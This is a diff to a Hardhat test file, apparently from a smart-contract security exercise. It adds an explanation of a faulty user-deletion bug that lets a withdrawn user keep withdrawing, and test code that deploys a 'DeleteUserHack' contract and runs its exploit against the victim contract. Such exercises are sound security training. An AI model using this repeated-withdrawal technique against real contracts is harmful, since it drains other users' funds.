@@ -25,7 +25,20 @@ describe(NAME, function () {
       ({ victimContract, attackerWallet } = await loadFixture(setup));
     });
 
-    it("conduct your attack here", async function () {});
+    /**
+     * The problem is related with how to delete the index‘s user in the array. Assume there are 3 user, when the second user withdraw his balance,
+     * But the result is only delete the third user not the second user. though, the array's length become 2.
+     * 
+     * So the second user can contiune withdraw based on his data. 
+     * 
+     */
+    it("conduct your attack here", async function () {
+      const DeleteUserHackFactory = await ethers.getContractFactory("DeleteUserHack");
+      const deleteUserHack = await DeleteUserHackFactory.deploy();
+
+      await deleteUserHack.connect(attackerWallet).exploit(victimContract.address,{ value: ethers.utils.parseEther("1") });
+
+    });
 
     after(async function () {
       expect(
